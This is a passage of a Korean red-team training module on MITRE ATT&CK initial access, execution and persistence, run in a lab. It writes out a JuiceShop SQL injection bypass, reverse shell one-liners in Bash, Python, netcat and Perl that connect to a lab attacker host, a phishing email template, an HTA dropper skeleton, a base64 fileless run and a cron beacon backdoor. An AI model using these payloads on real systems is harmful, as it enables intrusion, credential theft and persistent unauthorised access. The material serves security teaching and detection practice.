# Week 02: 다단계 침투 — Initial Access, Execution, Persistence

## 학습 목표
- MITRE ATT&CK의 Initial Access(TA0001) 전술에서 피싱(T1566), 웹 익스플로잇(T1190), 유효 계정(T1078) 기법을 실습한다
- Execution(TA0002) 단계에서 리버스 셸, Python 페이로드, 스크립트 기반 실행 기법을 구현한다
- Persistence(TA0003) 기법으로 crontab, systemd 서비스, SSH authorized_keys, .bashrc 후킹을 설치한다
- 각 공격 단계별 Wazuh/Suricata 탐지 포인트를 식별하고 Blue Team 방어 전략을 수립할 수 있다
- OpsClaw execute-plan을 통한 다단계 침투 시뮬레이션을 자동화하고 PoW 증거를 검증한다
- 킬체인 3~5단계(전달→익스플로잇→설치)에 해당하는 실전 공격·방어 시나리오를 완전히 매핑한다

## 전제 조건
- 공방전 기초 과정(course11) 이수 완료
- Week 01 킬체인 및 ATT&CK 프레임워크 이해
- Linux 시스템 관리 기본 (cron, systemd, ssh 키 관리)
- 네트워크 기본 (TCP 3-way handshake, 포트, 방화벽 개념)
- OpsClaw 프로젝트 생성·실행 경험 (Week 01 실습 완료)

## 실습 환경 (공통)

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 공격 기지 / Control Plane | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 공격 대상 (JuiceShop, Apache) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh 4.11.2) | `sshpass -p1 ssh siem@10.20.30.100` |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | Part 1: Initial Access 이론 + 피싱 시뮬레이션 | 강의/실습 |
| 0:40-1:10 | Part 2: Execution — 리버스 셸 및 페이로드 실행 | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | Part 3: Persistence — 4가지 지속성 기법 설치 | 실습 |
| 2:00-2:40 | Part 4: Blue Team 탐지·방어 + OpsClaw 자동화 | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 종합 시나리오: 3단계 침투→탐지 전체 연습 | 실습/토론 |
| 3:20-3:40 | 검증 퀴즈 + 과제 안내 | 퀴즈 |

---

## 용어 해설

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **Initial Access** | 초기 접근 | 대상 네트워크에 최초 진입하는 단계 | 건물 정문 열기 |
| **피싱** | Phishing | 위장 이메일/메시지로 사용자를 속이는 기법 | 미끼를 던져 물고기 낚기 |
| **스피어 피싱** | Spear Phishing | 특정 인물을 대상으로 한 맞춤형 피싱 | 작살로 특정 물고기 잡기 |
| **리버스 셸** | Reverse Shell | 대상이 공격자에게 역방향으로 연결하는 셸 | 안에서 밖으로 전화 걸기 |
| **바인드 셸** | Bind Shell | 대상이 포트를 열고 공격자 접속을 대기 | 안에서 문 열어두기 |
| **Persistence** | 지속성 | 재부팅·로그아웃 후에도 접근 유지 | 비밀 뒷문 설치 |
| **Cron** | 크론 | Linux 시간 기반 작업 스케줄러 | 정해진 시간에 울리는 알람 |
| **Systemd** | 시스템디 | Linux 서비스 관리 데몬 | 건물 관리 시스템 |
| **웹셸** | Web Shell | 웹 서버에 설치된 명령 실행 스크립트 | 웹을 통한 원격 제어기 |
| **페이로드** | Payload | 공격 시 실제 실행되는 악성 코드 | 미사일의 탄두 |
| **드롭퍼** | Dropper | 다른 악성코드를 설치하는 1차 페이로드 | 수하물 전달자 |
| **C2 비콘** | C2 Beacon | C2 서버에 주기적으로 연결하는 신호 | 정기 보고 전화 |
| **FIM** | File Integrity Monitoring | 파일 무결성 모니터링 | 금고 봉인 확인 |
| **IOC** | Indicator of Compromise | 침해 지표 (IP, 해시, 파일명) | 범죄 현장 증거 |

---

# Part 1: Initial Access — 초기 침투 (40분)

## 1.1 Initial Access 전술 개요

Initial Access(TA0001)는 공격자가 대상 네트워크에 **최초로 발을 들여놓는** 단계이다. 킬체인의 3단계(전달)와 4단계(익스플로잇)에 해당하며, 모든 후속 공격의 시작점이 된다.

### ATT&CK Initial Access 기법 완전 매핑

| 기법 ID | 기법명 | 설명 | 실제 사용 빈도 | 탐지 난이도 |
|---------|--------|------|---------------|------------|
| T1566.001 | Spear Phishing Attachment | 악성 첨부파일이 포함된 맞춤형 이메일 | 매우 높음 | 중간 |
| T1566.002 | Spear Phishing Link | 악성 URL이 포함된 이메일 | 높음 | 중간 |
| T1566.003 | Spear Phishing via Service | 소셜 미디어/메신저를 통한 피싱 | 중간 | 높음 |
| T1190 | Exploit Public-Facing Application | 공개 서비스의 취약점 직접 익스플로잇 | 높음 | 낮음 |
| T1133 | External Remote Services | VPN, RDP, SSH 등 원격 접근 서비스 탈취 | 높음 | 중간 |
| T1078 | Valid Accounts | 유출되거나 추측된 정상 자격증명 사용 | 매우 높음 | 높음 |
| T1195.001 | Supply Chain: SW Supply Chain | 소프트웨어 공급망 침해 | 낮음 | 매우 높음 |
| T1195.002 | Supply Chain: SW Distribution | 소프트웨어 배포 채널 침해 | 낮음 | 매우 높음 |
| T1189 | Drive-by Compromise | 웹사이트 방문만으로 감염 | 중간 | 중간 |
| T1091 | Replication Through Removable Media | USB 등 이동식 미디어 | 낮음 | 낮음 |

### 공격 벡터별 성공률과 방어 전략

```
공격 벡터 성공률 (업계 평균, 2024 기준):

스피어 피싱 첨부파일    ████████████████░░░░  ~30% (보안 인식 교육 미실시 시)
스피어 피싱 링크        ██████████████░░░░░░  ~25%
유효 계정 (자격증명 탈취) ████████████████████  ~40% (MFA 미적용 시)
웹 애플리케이션 익스플로잇 ████████░░░░░░░░░░░░  ~15% (패치 미적용 시)
공급망 공격             ██░░░░░░░░░░░░░░░░░░  ~5%  (성공 시 파급력 최대)
```

## 1.2 피싱 공격의 해부학

피싱은 Initial Access의 가장 보편적인 기법이다. 공격 성공률이 높고 기술 난이도가 상대적으로 낮아 APT 그룹이 가장 선호하는 초기 침투 방법이다.

### 피싱 공격 4단계 프로세스

```
+-----------------------------------------------------------------+
|                    피싱 공격 프로세스                              |
+-----------+-----------------------------------------------------+
| 1. 사전 조사 | 대상 조직의 이메일 형식, 직원 정보, 협력사 파악         |
|           | LinkedIn, 홈페이지, OSINT으로 수집                    |
+-----------┼-----------------------------------------------------+
| 2. 미끼 제작 | 신뢰할 수 있는 발신자/주제로 이메일 작성                |
|           | 악성 문서(매크로), 링크, HTML 첨부파일 준비             |
+-----------┼-----------------------------------------------------+
| 3. 전달    | 메일 서버 → 스팸 필터 → 받은 편지함                   |
|           | SPF/DKIM/DMARC 우회, 도메인 스푸핑                   |
+-----------┼-----------------------------------------------------+
| 4. 실행    | 사용자가 첨부파일 열기 / 링크 클릭                     |
|           | 매크로 실행 → 드롭퍼 → 페이로드 다운로드 → C2 연결    |
+-----------+-----------------------------------------------------+
```

### 실제 APT 그룹의 피싱 사례

| APT 그룹 | 피싱 주제 | 첨부파일 유형 | ATT&CK Sub-technique |
|----------|----------|-------------|---------------------|
| APT29 | COVID-19 백신 연구 | PDF + HTA 드롭퍼 | T1566.001 |
| APT28 | NATO 회의 초대장 | Word 매크로 | T1566.001 |
| Lazarus | 채용 제안서 | ZIP 내 LNK 파일 | T1566.001 |
| APT41 | 소프트웨어 라이선스 갱신 | ISO 디스크 이미지 | T1566.001 |
| Kimsuky | 학술 논문 리뷰 요청 | HWP 매크로 | T1566.001 |

## 1.3 웹 애플리케이션 공격을 통한 초기 침투

T1190(Exploit Public-Facing Application)은 인터넷에 노출된 웹 서비스의 취약점을 직접 공격하여 초기 접근을 획득하는 기법이다.

### 주요 웹 취약점과 ATT&CK 매핑

| 취약점 | CWE | 공격 효과 | 심각도 |
|--------|-----|----------|--------|
| SQL Injection | CWE-89 | 인증 우회, DB 데이터 탈취 | Critical |
| Command Injection | CWE-78 | 서버 명령 실행 (RCE) | Critical |
| SSRF | CWE-918 | 내부 서비스 접근 | High |
| 파일 업로드 취약점 | CWE-434 | 웹셸 설치 | Critical |
| XSS (Stored) | CWE-79 | 세션 탈취, 피싱 | Medium-High |
| IDOR | CWE-639 | 비인가 데이터 접근 | Medium |

## 실습 1.1: OpsClaw 환경 확인 및 프로젝트 생성

> **실습 목적**: 다단계 침투 시뮬레이션을 위한 OpsClaw 프로젝트를 생성하고 실습 환경의 정상 동작을 확인한다.
>
> **배우는 것**: OpsClaw 프로젝트 생명주기, execute-plan 사용법, 멀티 서버 환경에서의 사전 점검 절차를 복습한다.
>
> **결과 해석**: 모든 서버의 health 응답이 정상이면 실습 준비가 완료된 것이다. SubAgent 미응답 시 해당 서버 실습이 제한된다.
>
> **실전 활용**: 레드팀 작전 전 공격 인프라 점검은 필수이다. 작전 중 도구 오류는 탐지 위험을 크게 높인다.

```bash
# API 키 설정
export OPSCLAW_API_KEY=opsclaw-api-key-2026

# Manager API 상태 확인
curl -s http://localhost:8000/health | python3 -m json.tool
# 예상 출력:
# {
#     "status": "ok"
# }
```

```bash
# 전체 SubAgent 상태 점검
for host in 10.20.30.201 10.20.30.1 10.20.30.80 10.20.30.100; do
  echo "=== $host ==="
  curl -s --connect-timeout 3 http://$host:8002/health 2>/dev/null || echo "UNREACHABLE"
done
# 각 서버의 SubAgent 상태가 출력된다
```

> **명령어 해설**: `--connect-timeout 3`은 3초 내 연결되지 않으면 타임아웃으로 처리한다. 실습 시작 전 모든 서버가 응답하는지 반드시 확인한다.
>
> **트러블슈팅**: SubAgent가 응답하지 않으면 해당 서버에 SSH 접속 후 `ps aux | grep subagent`로 프로세스 상태를 확인한다. 프로세스가 없으면 `./start_subagent.sh`로 기동한다.

```bash
# 다단계 침투 시뮬레이션 프로젝트 생성
curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "name": "week02-multi-stage-intrusion",
    "request_text": "다단계 침투 시뮬레이션: Initial Access → Execution → Persistence",
    "master_mode": "external"
  }' | python3 -m json.tool
# 반환된 프로젝트 ID를 메모한다
```

```bash
# 프로젝트 ID 설정 (실제 반환된 값으로 교체)
export PROJECT_ID="반환된-프로젝트-ID"

# Stage 전환: plan → execute
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/plan \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool

curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool
```

## 실습 1.2: 피싱 시뮬레이션 — GoPhish 스타일 페이로드 생성

> **실습 목적**: 스피어 피싱 공격의 전체 프로세스를 실습한다. 악성 첨부파일(HTA)을 생성하고, 피싱 메일 템플릿을 작성하여 공격자의 관점을 체험한다.
>
> **배우는 것**: HTA(HTML Application) 페이로드 구조, 피싱 메일 소셜 엔지니어링 기법, 파일 기반 공격의 탐지 포인트를 이해한다.
>
> **결과 해석**: HTA 파일이 정상 생성되면 1단계 성공이다. 실제 공격에서는 이 파일이 이메일에 첨부되어 대상에게 전달된다. 파일 크기, 확장자, 내용의 난독화 수준이 탐지 회피에 영향을 미친다.
>
> **실전 활용**: 레드팀은 조직의 보안 인식 수준을 평가하기 위해 피싱 캠페인을 수행한다. GoPhish, King Phisher 등의 도구가 실무에서 사용된다.

```bash
# 피싱 페이로드 생성: HTA (HTML Application) 형태
# 실습용으로 실제 악성 동작 없이 시뮬레이션만 수행한다
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"[PHISHING SIM] HTA 페이로드 생성\" && cat > /tmp/sim_invoice.hta << '\''HTAEOF'\'' \n<html><head><HTA:APPLICATION ID=\"sim\" APPLICATIONNAME=\"Invoice\">\n<script language=\"VBScript\">\n'\''  실습용: 실제 악성 동작 없음\nSub Window_OnLoad\n  MsgBox \"[SIM] 피싱 페이로드 실행됨 - 이 시점에 리버스 셸이 생성될 수 있음\"\n  '\'' 실전에서는 여기서 PowerShell 다운로더 실행\n  '\'' CreateObject(\"WScript.Shell\").Run \"powershell -ep bypass -c IEX(...)\"\nEnd Sub\n</script></head><body></body></html>\nHTAEOF\nls -la /tmp/sim_invoice.hta && file /tmp/sim_invoice.hta && echo \"[OK] 페이로드 크기: $(wc -c < /tmp/sim_invoice.hta) bytes\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"[PHISHING SIM] 피싱 메일 템플릿 생성\" && cat > /tmp/phishing_template.txt << '\''MAILEOF'\'' \nFrom: hr-team@company-benefits.com\nTo: target@victim-corp.com\nSubject: [긴급] 2026년 상반기 성과급 확인 요청\n\n안녕하세요, 인사팀입니다.\n\n2026년 상반기 성과급 산정이 완료되었습니다.\n첨부된 파일에서 본인의 성과급 내역을 확인해 주세요.\n\n파일명: 2026_상반기_성과급_내역.hta\n비밀번호: company2026\n\n확인 기한: 금일 18:00까지\n미확인 시 이의제기 기간이 종료됩니다.\n\n감사합니다.\n인사운영팀 드림\nMAILEOF\necho \"[OK] 피싱 메일 템플릿 생성 완료\" && wc -l /tmp/phishing_template.txt",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - HTA(HTML Application)는 Windows에서 HTML을 독립 실행 파일처럼 실행하는 형식으로, 보안 경계를 우회하는 데 자주 사용된다
> - 피싱 메일은 **긴급성**(기한 명시), **권위**(인사팀), **호기심**(성과급)의 3가지 심리적 트리거를 사용한다
> - 실습에서는 시뮬레이션 메시지만 출력하며 실제 악성 동작은 포함하지 않는다
>
> **트러블슈팅**: 파일 생성 실패 시 `/tmp` 디렉토리의 쓰기 권한을 확인한다. `ls -la /tmp/`로 퍼미션을 점검한다.

## 실습 1.3: 웹 애플리케이션 익스플로잇을 통한 초기 침투

> **실습 목적**: JuiceShop 웹 애플리케이션의 SQL Injection과 SSRF 취약점을 이용하여 초기 접근을 획득한다. T1190(Exploit Public-Facing Application)의 실전 구현이다.
>
> **배우는 것**: SQL Injection을 통한 인증 우회, SSRF를 통한 내부 서비스 접근, 웹 취약점의 연쇄 활용(Chaining) 기법을 이해한다.
>
> **결과 해석**: SQL Injection 성공 시 인증 토큰이 반환된다. 이 토큰으로 관리자 기능에 접근할 수 있다. SSRF 성공 시 내부 서비스의 응답이 반환되어 내부 네트워크 구조를 파악할 수 있다.
>
> **실전 활용**: 웹 애플리케이션은 가장 널리 노출된 공격 표면이다. OWASP Top 10 취약점은 실무 침투 테스트의 기본 체크리스트이다.

```bash
# SQL Injection을 통한 인증 우회 (T1190)
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"[T1190] SQL Injection 인증 우회 시도\" && curl -s -X POST http://10.20.30.80:3000/rest/user/login -H \"Content-Type: application/json\" -d '\''{\"email\":\"'\\'' OR 1=1--\",\"password\":\"anything\"}'\'' 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20 || echo \"JuiceShop 미응답\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"[T1190] 디렉토리 트래버설 시도\" && curl -s http://10.20.30.80:3000/ftp/package.json.bak%2500.md 2>/dev/null | head -20 || echo \"파일 접근 실패\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "echo \"[T1190] API 엔드포인트 탐색\" && for path in api api-docs rest/products/search?q= rest/user/whoami; do echo \"--- /$path ---\" && curl -s -o /dev/null -w \"HTTP %{http_code}\" http://10.20.30.80:3000/$path 2>/dev/null && echo; done",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - `' OR 1=1--`: 클래식 SQL Injection 페이로드로, WHERE 조건을 항상 참으로 만들어 첫 번째 사용자(주로 관리자)로 로그인한다
> - `%2500.md`: Null byte injection으로 파일 확장자 검증을 우회하는 기법이다
> - API 엔드포인트 탐색은 공격 표면 매핑의 핵심 단계이며, HTTP 응답 코드로 존재 여부를 판단한다
>
> **트러블슈팅**: JuiceShop이 응답하지 않으면 web 서버에서 `docker ps`로 컨테이너 상태를 확인한다. `curl -s http://10.20.30.80:3000/` 응답이 없으면 서비스가 미기동 상태이다.

---

# Part 2: Execution — 코드 실행 (30분)

## 2.1 Execution 전술 개요

Execution(TA0002)은 공격자가 대상 시스템에서 **악성 코드를 실행**하는 단계이다. Initial Access로 진입한 후 실제 공격 행위를 수행하기 위한 핵심 단계이며, 킬체인 4단계(익스플로잇)에 해당한다.

### Linux 환경 Execution 기법 분류

| 기법 ID | 기법명 | 설명 | 탐지 포인트 | 위험도 |
|---------|--------|------|------------|--------|
| T1059.004 | Unix Shell | bash, sh, zsh 등 셸 명령 실행 | 프로세스 생성 로그 | 높음 |
| T1059.006 | Python | Python 스크립트/원라이너 실행 | python 프로세스 모니터링 | 중간 |
| T1059.007 | JavaScript | Node.js 기반 스크립트 실행 | node 프로세스 모니터링 | 중간 |
| T1053.003 | Cron | 크론 작업을 통한 지연 실행 | crontab 변경 감시 | 중간 |
| T1053.005 | Systemd Timers | systemd 타이머를 통한 실행 | 타이머 유닛 변경 감시 | 중간 |
| T1204.002 | User Execution: Malicious File | 사용자가 악성 파일을 직접 실행 | 의심 파일 실행 이벤트 | 낮음 |

### 리버스 셸 vs 바인드 셸 비교

| 항목 | 리버스 셸 (Reverse Shell) | 바인드 셸 (Bind Shell) |
|------|--------------------------|----------------------|
| 연결 방향 | 대상 → 공격자 | 공격자 → 대상 |
| 방화벽 우회 | 아웃바운드 허용 시 통과 | 인바운드 차단 시 실패 |
| NAT 환경 | 대상이 NAT 뒤에 있어도 동작 | NAT 뒤의 대상에 연결 불가 |
| 선호도 | **실전에서 주로 사용** | 제한적 상황에서만 사용 |
| 탐지 | 이상 아웃바운드 연결 탐지 | 이상 리스닝 포트 탐지 |
| ATT&CK | T1059.004 | T1059.004 |

```
리버스 셸 동작 원리:

공격자 (10.20.30.201)              대상 (10.20.30.80)
+-----------------+              +-----------------+
| nc -lvnp 4444   | <----------  | bash -i >& ...  |
| (포트 4444 대기)  |   TCP 연결   | (역방향 연결)     |
|                 |   생성       |                 |
| $ whoami        | ---------->  | → 명령 실행      |
| web             | <----------  | ← 결과 전송      |
+-----------------+              +-----------------+
```

## 실습 2.1: 리버스 셸 구성 및 실행

> **실습 목적**: 초기 침투 후 대화형 셸을 확보하는 과정을 실습한다. 여러 가지 리버스 셸 기법을 구현하고, 각각의 네트워크 특성과 탐지 포인트를 이해한다.
>
> **배우는 것**: Bash, Python, Netcat 기반 리버스 셸의 구조적 차이, 파일 디스크립터 리다이렉션 원리, 네트워크 연결 분석 기법을 이해한다.
>
> **결과 해석**: 리버스 셸이 성공하면 공격자 터미널에서 대상 서버의 셸 프롬프트가 나타난다. `whoami`, `id`, `hostname` 명령으로 현재 컨텍스트를 확인한다. 연결이 실패하면 방화벽 룰이나 네트워크 경로를 점검해야 한다.
>
> **실전 활용**: 리버스 셸은 침투 테스트의 가장 기본적인 도구이다. OSCP, GPEN 등 실기 시험에서 필수로 사용되며, Metasploit 없이 수동으로 구성할 수 있어야 한다.

```bash
# 방법 1: Bash 리버스 셸 (가장 기본적)
# 공격자 측 (opsclaw 서버, 터미널 1): 리스너 대기
# nc -lvnp 4444

# 대상 측 (web 서버): 리버스 셸 실행 — OpsClaw를 통해 시뮬레이션
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"[REVERSE SHELL SIM] Bash 리버스 셸 페이로드 목록 생성\" && echo \"=== Bash ===\"  && echo \"bash -i >& /dev/tcp/10.20.30.201/4444 0>&1\" && echo && echo \"=== Python3 ===\" && echo \"python3 -c '\\''import socket,subprocess,os;s=socket.socket();s.connect((\"10.20.30.201\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\\''\" && echo && echo \"=== Netcat (OpenBSD) ===\" && echo \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.20.30.201 4444 >/tmp/f\" && echo && echo \"=== Perl ===\" && echo \"perl -e '\\''use Socket;\\$i=\"10.20.30.201\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'\\''\"",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"[EXECUTION TEST] web 서버에서 현재 권한 확인\" && whoami && id && hostname && echo \"--- 네트워크 정보 ---\" && ip addr show 2>/dev/null | grep -E \"inet \" && echo \"--- 실행 중인 서비스 ---\" && ss -tlnp 2>/dev/null | head -15",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - `bash -i >& /dev/tcp/IP/PORT 0>&1`: Bash의 특수 파일 `/dev/tcp`를 이용하여 TCP 연결을 생성하고, stdin/stdout/stderr를 리다이렉트한다
> - `os.dup2(s.fileno(), 0)`: Python에서 소켓의 파일 디스크립터를 표준 입출력으로 복제하는 시스템 콜이다
> - `mkfifo /tmp/f`: 명명된 파이프를 생성하여 netcat의 입출력을 bash에 연결하는 기법이다
> - `ss -tlnp`: 현재 리스닝 중인 TCP 포트를 PID와 함께 표시한다
>
> **트러블슈팅**: 리버스 셸 연결이 실패하면 `nftables`/`iptables` 규칙을 확인한다. `nft list ruleset | grep 4444` 또는 `iptables -L -n | grep 4444`로 포트 차단 여부를 점검한다.

## 실습 2.2: Python 기반 고급 페이로드

> **실습 목적**: 파일리스(Fileless) 실행 기법으로 디스크에 흔적을 남기지 않는 페이로드를 생성한다. 메모리 상에서만 실행되는 공격은 전통적 AV/EDR의 파일 스캔을 우회한다.
>
> **배우는 것**: 파일리스 공격의 원리, Python 원라이너 난독화, Base64 인코딩을 통한 페이로드 은닉 기법을 이해한다.
>
> **결과 해석**: Base64 인코딩된 페이로드가 정상 디코딩·실행되면 성공이다. 파일 시스템에 흔적이 없으므로 전통적 FIM(File Integrity Monitoring)으로는 탐지할 수 없다.
>
> **실전 활용**: 최신 APT 공격의 70% 이상이 파일리스 기법을 포함한다. Defense Evasion(TA0005)과 결합하여 탐지 회피 효과가 극대화된다.

```bash
# Python 기반 파일리스 페이로드 시뮬레이션
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/dispatch \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "command": "echo \"[FILELESS SIM] Base64 인코딩된 Python 페이로드 생성\" && PAYLOAD=$(echo \"import os; print(f'\\''[SIM] PID={os.getpid()}, User={os.getenv(\"USER\",\"unknown\")}, CWD={os.getcwd()}'\\'')\") && ENCODED=$(echo \"$PAYLOAD\" | base64 -w0) && echo \"인코딩된 페이로드: $ENCODED\" && echo \"--- 디코딩 후 실행 ---\" && echo \"$ENCODED\" | base64 -d | python3 && echo \"[OK] 디스크에 파일 없이 실행 완료\"",
    "subagent_url": "http://10.20.30.80:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - `base64 -w0`: Base64 인코딩 시 줄바꿈 없이 한 줄로 출력한다. 페이로드를 명령줄 인자로 전달할 때 필수이다.
> - `echo "$ENCODED" | base64 -d | python3`: 파이프로 디코딩 후 즉시 Python 인터프리터에 전달하여 실행한다. 디스크 I/O가 발생하지 않는다.
>
> **트러블슈팅**: `python3: command not found` 오류 시 `python3.11` 또는 `python`으로 대체한다. `which python3`으로 경로를 확인한다.

---

# Part 3: Persistence — 지속성 확보 (40분)

## 3.1 Persistence 전술 개요

Persistence(TA0003)는 공격자가 시스템 재부팅, 자격증명 변경, 네트워크 중단 후에도 **지속적으로 접근을 유지**하는 기법이다. 킬체인 5단계(설치)에 해당하며, APT 공격에서 가장 중요한 단계 중 하나이다.

### Linux Persistence 기법 완전 매핑

| 기법 ID | 기법명 | 설명 | 생존 조건 | 탐지 난이도 | 은닉 수준 |
|---------|--------|------|----------|------------|----------|
| T1053.003 | Cron | crontab에 악성 작업 등록 | 재부팅 생존 | 낮음 | 낮음 |
| T1053.005 | Systemd Timers | systemd 타이머 유닛 등록 | 재부팅 생존 | 중간 | 중간 |
| T1543.002 | Systemd Service | systemd 서비스로 등록 | 재부팅 생존 | 중간 | 중간 |
| T1098.004 | SSH Authorized Keys | SSH 공개키 추가 | 재부팅 생존 | 중간 | 중간 |
| T1546.004 | .bashrc/.profile | 셸 시작 시 실행 | 로그인 시 | 낮음 | 낮음 |
| T1574.006 | LD_PRELOAD | 공유 라이브러리 하이재킹 | 프로그램 실행 시 | 높음 | 높음 |
| T1505.003 | Web Shell | 웹 서버에 실행 가능 스크립트 | 웹 서비스 생존 | 중간 | 중간 |
| T1136.001 | Local Account | 로컬 사용자 계정 생성 | 재부팅 생존 | 낮음 | 낮음 |
| T1547.013 | XDG Autostart | 데스크톱 자동 시작 | GUI 로그인 시 | 중간 | 중간 |

### Persistence 기법 선택 기준

```
선택 기준 매트릭스:

              은닉 필요    빠른 설치    루트 불필요    재부팅 생존
Cron           △           ◎           ◎            ◎
Systemd Svc    ○           ○           ✕            ◎
SSH Key        ○           ◎           ◎            ◎
.bashrc        ✕           ◎           ◎            △ (로그인 시만)
LD_PRELOAD     ◎           △           ✕            ◎
Web Shell      ○           ◎           ◎            ◎

◎=우수  ○=양호  △=보통  ✕=불가/부적합
```

## 실습 3.1: Cron 기반 지속성 설치

> **실습 목적**: 가장 기본적이면서 효과적인 Persistence 기법인 crontab 백도어를 설치한다. T1053.003(Cron)의 실전 구현이다.
>
> **배우는 것**: crontab 문법, 주기적 C2 비콘의 원리, cron 기반 백도어의 탐지 방법과 제거 절차를 이해한다.
>
> **결과 해석**: `crontab -l`로 등록된 작업이 확인되면 설치 성공이다. 5분 간격(`*/5`)으로 C2 서버에 비콘 신호를 전송하는 구조이다. 실습 후 반드시 제거해야 한다.
>
> **실전 활용**: Cron 백도어는 단순하지만 효과적이다. 방어자는 `crontab -l`, `/var/spool/cron/`, `/etc/cron.d/` 세 위치를 모두 점검해야 한다.

```bash
# Cron 기반 persistence 설치 시뮬레이션
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"[T1053.003] Cron Persistence 설치 시뮬레이션\" && echo \"# 실습용 cron 작업 (실제 C2 연결 없음)\" && echo \"*/5 * * * * /usr/bin/curl -s http://10.20.30.201:8080/beacon?h=$(hostname) > /dev/null 2>&1\" > /tmp/sim_cron_backdoor.txt && echo \"--- 백도어 cron 내용 ---\" && cat /tmp/sim_cron_backdoor.txt && echo && echo \"--- 현재 crontab (설치 전) ---\" && crontab -l 2>/dev/null || echo \"(비어있음)\" && echo && echo \"[참고] 실제 설치: crontab /tmp/sim_cron_backdoor.txt\" && echo \"[참고] 은닉 기법: 정상 cron 사이에 삽입, 주석으로 위장\"",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"[DETECT] Cron 감사 — 모든 cron 위치 점검\" && echo \"=== 사용자 crontab ===\"  && for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u $u 2>/dev/null && echo \"  ↑ user: $u\"; done && echo \"=== /etc/crontab ===\" && cat /etc/crontab 2>/dev/null | grep -v '^#' | grep -v '^$' && echo \"=== /etc/cron.d/ ===\" && ls -la /etc/cron.d/ 2>/dev/null && echo \"=== /var/spool/cron/ ===\" && ls -la /var/spool/cron/crontabs/ 2>/dev/null",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - `*/5 * * * *`: cron 시간 표현으로 "매 5분마다" 실행을 의미한다. 분(0-59) 시(0-23) 일(1-31) 월(1-12) 요일(0-7)
> - `/dev/null 2>&1`: 표준 출력과 에러를 모두 버려 로그에 흔적을 남기지 않는다
> - `$(hostname)`: 비콘 호출 시 호스트명을 파라미터로 전달하여 C2 서버가 피해 시스템을 식별할 수 있게 한다
> - `/var/spool/cron/crontabs/`: 사용자별 crontab 파일이 저장되는 디렉토리이다
>
> **트러블슈팅**: `crontab: command not found` 오류 시 `dpkg -l | grep cron`으로 cron 패키지 설치 여부를 확인한다. 컨테이너 환경에서는 cron이 기본 설치되지 않을 수 있다.

## 실습 3.2: Systemd 서비스 기반 지속성

> **실습 목적**: 시스템 서비스로 위장한 백도어를 설치한다. T1543.002(Create or Modify System Process: Systemd Service)의 구현이다.
>
